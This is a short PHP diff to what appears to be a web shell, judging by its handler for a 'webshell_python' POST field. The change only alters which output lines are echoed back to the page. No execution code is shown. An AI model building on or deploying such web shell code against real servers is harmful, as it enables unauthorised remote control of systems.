@@ -196,6 +196,9 @@ if(isset($_POST["webshell_python"])){
     if(count($fewLines) > 2){
         echo utf8_encode($fewLines[count($fewLines)-2]);
         echo "<br>";
+        
+    }
+    if(count($fewLines) > 4){
         echo utf8_encode($lastLine[count($lastLine)-2]);
     }
     
